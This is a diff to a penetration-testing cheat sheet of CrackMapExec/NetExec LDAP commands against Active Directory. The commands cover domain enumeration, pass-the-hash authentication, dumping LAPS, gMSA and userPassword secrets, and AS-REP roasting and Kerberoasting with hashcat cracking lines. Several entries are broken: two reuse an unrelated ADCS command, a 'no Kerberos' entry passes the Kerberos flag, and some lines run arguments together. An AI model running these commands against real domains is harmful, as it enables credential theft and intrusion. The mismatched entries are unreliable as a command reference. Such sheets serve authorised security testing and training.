@@ -2,53 +2,371 @@
 
 % cme, crackmapexec, Active Directory, nxc, netexec, ldap
 
+## Enumerate domain users
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user 
+
+Enumerate non-domain users.
+
+```bash
+cme ldap <dc-ip> -u <users.list> -p '' -k
+```
+
+## Enumerate domain users
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user 
+
+Enumerate domain users.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> --users
+```
+
 ## Enumerate users descriptions
-#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user 
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user 
+
+Enumerate domain users descriptions.
 
 ```bash
 cme ldap <dc-ip> -u <user> -p <password> -M get-desc-users
 ```
 
+## Enumerate domain users with adminCount=1
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user 
+
+Enumerate domain users with adminCount=1.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> --admin-count
+```
+
+## Enumerate domain computers
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Enumerate domain computers via a provided text.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> --computers
+```
+
 ## Enumerate domain groups
-#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Enumerate domain groups.
 
 ```bash
 cme ldap <dc-ip> -u <user> -p <password> --groups
 ```
 
-## ASREPRoast enum without authentication
-#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Anonymous 
+## Enumerate members of a domain group
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user
 
-User can be a wordlist too (user.txt)
-Hashcat format  -m 18200 
+Enumerate all members within a domain groups.
 
 ```bash
-cme ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc-ip>
+cme ldap <dc-ip> -u <user> -p <password> -M groups-mem
 ```
 
-## ASREPRoast enum with authentication
+## Enumerate groups of a domain user
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Enumerate all groups for a given domain user.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> -M groupsmembership
+```
+
+## Enumerate DC IPs
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user 
+
+Enumerate Domain Controllers IP addresses.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> --dc-list
+```
+
+## Enumerate domain trusts
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Enumerate domain trusts relationships and direction.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> -M enum_trust
+```
+
+## Enumerate domain SID
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Enumerate the domain SID.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> --get-sid
+```
+
+## Enumerate DNS entries 
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Enumerate DNS entries with the corresponding IP from the domain.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> -M get-network
+```
+
+## Enumerate subnets
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Enumerate the different sites and subnets of the domain.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> -M subnets
+```
+
+## Enumerate PKI enrollment servers (ADCS)
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+List all PKI Enrollment servers.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> -M adcs
+```
+
+## Enumerate templates inside a PKI (ADCS)
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+List all templates inside a PKI.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> -M adcs -o SERVER=<adcs_server>
+```
+
+## Enumerate obsolete OS
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Enumerate all hosts running on obsolete OS in the domain.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> -M adcs -o SERVER=<adcs_server>
+```
+
+## Enumerate Fine-Grained Password policy
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Enumerate the Fine-Grained password policy defined on the domain.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> -M adcs -o SERVER=<adcs_server>
+```
+
+## Enumerate misconfigured delegation
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Enumerate all misconfigured delegations on the domain.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> --find-delegation
+```
+
+## Enumerate SCCM
+#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Enumerate SCCM entities within the domain (SCCM Site-Servers, SCCM Sites, SCCM Management Points and Users, Computers or Groups related to SCCM)
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> -M sccm -o REC_RESOLVE=TRUE
+```
+
+## Check MachineAccountQuota (MAQ)
+#assessment/AD #attack_type/Check #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Check the MachineAccountQuota value defined on the domain.
+
+```bash
+cme ldap <ip> -u <user> -p <password> -M maq
+```
+
+## Check LDAPS and Channel binding
+#assessment/AD #attack_type/Check #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Check whether LDAP signing and Channel binding are required and / or enforced on the domain.
+
+```bash
+cme ldap <ip> -u <user> -p <password> -M ldap
+```
+
+## LDAP auth (no Kerberos)
+#assessment/AD #attack_type/Authentication #port/389 #port/639 #protocol/ldap #access/LDAP_user
+
+Authenticate via a LDAP account without kerberos.
+
+```bash
+cme ldap <ip> -u <user> -p <password> -k
+```
+
+## Domain auth
+#assessment/AD #attack_type/Authentication #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Authenticate via a domain account.
+
+```bash
+cme ldap <ip> -u <user> -p <password> -d <domain>
+```
+
+## Domain auth with hash
+#assessment/AD #attack_type/Authentication #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Authenticate via a domain account using the hash.
+
+```bash
+cme ldap <ip> -u <user> -H <hash> -d <domain>
+```
+
+## Local auth
+#assessment/AD #attack_type/Authentication #port/389 #port/639 #protocol/ldap #access/Local_user
+
+Authenticate via a local account on the remote target.
+
+```bash
+cme ldap <ip> -u <user> -p <password> --local-auth
+```
+
+## Local auth with hash
+#assessment/AD #attack_type/Authentication #port/389 #port/639 #protocol/ldap #access/Local_user
+
+Authenticate via a local account on the remote target.
+
+```bash
+cme ldap <ip> -u <user> -H <hash> --local-auth
+```
+
+## Read LAPS password
 #assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user
 
-Hashcat format  -m 18200 
+Read all LAPS passwords.
+
+⚠️ Requirement : ms-Mcs-AdmPwd attribute set "Read Property" on a computer object.
 
 ```bash
-cme ldap <ip> -u <user> -p <password> --asreproast ASREProastables.txt --kdcHost <dc-ip>
+cme ldap <dc-ip> -u <user> -p <password> -M laps
 ```
 
-## Kerberoasting
-#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user 
+## Read gMSA password
+#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user
 
-Hashcat format  -m 13100
+Read the password of a gMSA account.
+
+⚠️ Requirement : msDS-ManagedPassword attribute set "Read Property" on a gMSA account and LDAPS enabled.
 
 ```bash
-cme ldap <ip> -u <user> -p <password> --kerberoasting kerberoastables.txt --kdcHost <dc-ip>
+cme ldap <dc-ip> -u <user> -p <password> --gmsa
+```
+
+## Convert gMSA LSA hash
+#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Convert the hash of a gMSA account when retrieved from the LSA.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> --gmsa-convert-id <gmsa_hash>
+```
+
+## Decrypt gMSA LSA hash
+#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Decrypt the password of a gMSA account when retrieved from the LSA.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> --gmsa-decrypt-lsa <SC_GMSA_{}>
+```
+
+## Get userPassword attribute
+#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Get userPassword attribute from all non-AD users in LDAP.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> -M get-userPassword
+```
+
+## Get unixUserPassword attribute
+#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Get unixUserPassword attribute from all non-AD users in LDAP.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> -M get-unixUserPassword
+```
+
+## Get Pre2K accounts
+#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Identify pre-created computer accounts, save the results to a file, and obtain TGTs for each.
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> -M pre2k
+```
+
+## Get PASSWD_NOTREQD accounts
+#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Identify users with the flag PASSWD_NOTREQD (password not required).
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> --password-not-required
 ```
 
 ## Unconstrained delegation
-#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user 
+#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user
 
-List of all computers and users with the flag TRUSTED_FOR_DELEGATION.
+Identify computers and users with the flag TRUSTED_FOR_DELEGATION.
 
 ```bash
-cme ldap <ip> -u <user> -p <password> --trusted-for-delegation
+cme ldap <dc-ip> -u <user> -p <password> --trusted-for-delegation
+```
+
+## ASREPRoast enum without authentication
+#assessment/AD #attack_type/Bruteforce #port/389 #port/639 #protocol/ldap #access/Anonymous 
+
+Retrieve the Kerberos AS-REP hash of user accounts without Kerberos pre-authentication required.
+hashcat -m 18200 ASREProastables.txt `fzf-wordlists`
+
+```bash
+cme ldap <dc-ip> -u <users.list> -p '' --asreproast ASREProastables.txt
+```
+
+## ASREPRoast enum with authentication
+#assessment/AD #attack_type/Bruteforce #port/389 #port/639 #protocol/ldap #access/Domain_user
+
+Retrieve the Kerberos AS-REP hash of user accounts without Kerberos pre-authentication required.
+
+hashcat -m 18200 ASREProastables.txt `fzf-wordlists`
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> --asreproast ASREProastables.txt
+```
+
+## Kerberoasting (SPN)
+#assessment/AD #attack_type/Bruteforce #port/389 #port/639 #protocol/ldap #access/Domain_user 
+
+Retrieve the Kerberos TGS-REP hash of user accounts with a ServicePrincipalName (SPN) using Kerberoasting.
+
+hashcat -m13100 kerberoastables.txt `fzf-wordlists`
+
+```bash
+cme ldap <dc-ip> -u <user> -p <password> --kerberoasting kerberoastables.txt
+```
+
+## Read DACL rights
+#assessment/AD #attack_type/Other #port/389 #port/639 #protocol/ldap #access/Domain_user 
+
+Read all the ACEs of a given object.
+
+```bash
+cme ldap <dc-ip> -u <user>-p <password> -M daclread -o TARGET=<object> ACTION=read
+```
+
+## BloodHound collector
+#assessment/AD #attack_type/Other #port/389 #port/639 #protocol/ldap #access/Domain_user 
+
+Run a BloodHound data collector.
+
+```bash
+cme ldap <dc-ip> -u <user>-p <password> --bloodhound --collection All
 ```
